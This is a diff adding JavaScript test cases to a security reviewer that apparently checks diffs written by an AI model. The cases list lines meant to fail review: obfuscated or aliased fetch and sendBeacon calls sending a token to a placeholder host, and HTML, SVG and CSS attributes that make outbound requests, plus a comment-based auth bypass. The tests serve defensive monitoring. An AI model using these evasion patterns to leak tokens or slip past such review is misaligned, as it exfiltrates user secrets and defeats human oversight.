@@ -125,3 +125,45 @@ test('security freezes submit handler against comment-only auth bypass while all
   const blockComment = base.replace('    if (!auth.user)', '    /* if (!auth.user)');
   assert.equal(assess(blockComment, '+    /* if (!auth.user) { return; }').status, 'failed');
 });
+
+
+test('independent Security rejects optional chaining and indirect browser API additions', () => {
+  for (const addition of [
+    "fetch?.(\"https://example.invalid/?key=\" + token);",
+    "navigator?.sendBeacon?.(\"https://example.invalid\", token);",
+    "window?.[\"open\"]?.(\"https://example.invalid\");",
+    "globalThis[\"fe\" + \"tch\"](\"https://example.invalid\");",
+    "const send = navigator.sendBeacon.bind(navigator);",
+    "const forward = fetch; forward(\"https://example.invalid\");",
+    "const transport = new WebTransport(\"https://example.invalid\");",
+    "const stream = new EventSource(\"https://example.invalid\");",
+    "const access = location?.assign;",
+    "self[\"fetch\"](\"https://example.invalid\");",
+  ]) {
+    assert.equal(inspectModelDiff({ ...input, diff: '+ ' + addition }).status, 'failed', addition);
+  }
+});
+
+test('independent Security rejects new HTML navigation, form, SVG and media transfer attributes', () => {
+  for (const addition of [
+    '+<iframe srcDoc={untrustedMarkup} />',
+    '+<button formAction="https://example.invalid/collect">Send</button>',
+    '+<input type="image" src="https://example.invalid/pixel" />',
+    '+<a ping="https://example.invalid/track">Open</a>',
+    '+<svg><image href="https://example.invalid/pixel" /></svg>',
+    '+<svg><use xlink:href="https://example.invalid/asset" /></svg>',
+    '+<video poster="https://example.invalid/pixel" />',
+    '+<meta httpEquiv="refresh" content="0;url=https://example.invalid/" />',
+  ]) {
+    assert.equal(inspectModelDiff({ ...input, diff: addition }).status, 'failed', addition);
+  }
+});
+
+test('independent Security rejects CSS imports and image-set URLs without fetch calls', () => {
+  for (const addition of [
+    '+const css = `@import "https://example.invalid/style.css";`;',
+    '+const css = `background: image-set("https://example.invalid/pixel" 1x);`;',
+  ]) {
+    assert.equal(inspectModelDiff({ ...input, diff: addition }).status, 'failed', addition);
+  }
+});
